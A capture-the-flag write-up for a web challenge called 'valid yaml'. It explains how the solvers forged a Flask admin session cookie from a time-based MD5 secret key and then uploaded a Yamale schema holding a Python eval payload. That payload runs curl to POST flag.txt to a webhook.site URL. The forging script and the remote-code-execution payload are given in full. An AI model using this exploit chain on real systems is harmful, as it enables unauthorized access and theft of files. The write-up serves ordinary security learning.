# Web: valid yaml
solvers: [L3d](https://github.com/imL3d), [ProfessorZak](https://github.com//ProfessorZak)  
writeup-writer: [L3d](https://github.com/imL3d)  

**Description:**
> Yet Another Markup Language, YAML, YAML Ain't Markup Language, Yamale
> https://thecybercoopctf-c608d319bd29-valid-yaml-0.chals.io

**files (copy):** [src.zip](files/src.zip)  
**screenshot:** [homepage](images/validyaml.png)  

In this challenge we receive a site and it's source that allows us to validate our yaml input to a preestablished schema. We need to exploit this site and get user access to it.

## Solution❄️
The source code for this website in python via flask, using the Yamale library in order to validate the yaml input. The first things that pops to mind the the [PyYaml Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization) that can allow us to get and RCE to the host machine? Could it be that the library used here have the same issue?  
Upon further examination, we find out that indeed `Yamale` runs on `PyYaml` and have the same issue, especially in the version that is used in the site - take a look at this [github issue + POC](https://github.com/23andMe/Yamale/issues/167).  
Great! we can just input this as the input... But wait. The exploit requires us to have influence on the schema and not just the input, and that is taken from the SQL database that we yet have control over:
```python
schema = Schemas.query.filter_by(id=schema_id).first_or_404() # If we can add our own schema... bingo!
schema = yamale.make_schema(content=schema.content) 
data = yamale.make_data(content=content)
```
So we need to get admin access. When digging further into the server code we see that we receive the formula for the [SECRET_KEY](https://flask.palletsprojects.com/en/2.3.x/config/#SECRET_KEY), which is pretty simple:
 ```python
SECRET_KEY = hashlib.md5(datetime.datetime.utcnow().strftime("%d/%m/%Y %H:%M").encode()).hexdigest()
```
This can allow us to bake our own `admin cookies`👨‍🍳, which in turn will allow us to upload our own schema, that can include the Python Deserialization payload!  
The code to generate the admin cookies (this needs to run on the same minute that the server deployed. If we don't know such time, we can just brute force for it):  
```python
""" Code to generate the admin cookies in the same way as the server """

from flask import Flask, session
from flask.sessions import SecureCookieSessionInterface
import datetime
import hashlib

SECRET_KEY = hashlib.md5(
        datetime.datetime.utcnow().strftime("%d/%m/%Y %H:%M").encode()
    ).hexdigest()

app = Flask("example")
app.secret_key = SECRET_KEY
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    
@app.route("/")
def test():
    session["id"] = 1 # This is the ID of the user (taken from the server source code)
    session_cookie = session_serializer.dumps(dict(session))
    return SECRET_KEY

if __name__ == "__main__":
    app.run()
```
After logging in as the admin, it's just as simple as uploading a new schema via the convenient page created for us by the site. The schema uploaded:  
```yaml
name: str([x.__init__.__globals__["sys"].modules["os"].system("curl -X POST --data-binary @flag.txt https://webhook.site/uniqueid") for x in ''.__class__.__base__.__subclasses__() if "_ModuleLock" == x.__name__])
age: int(max=200)
height: num()
awesome: bool()
```
And we get the flag: `flag{not_even_apache_can_stop_the_mighty_eval}`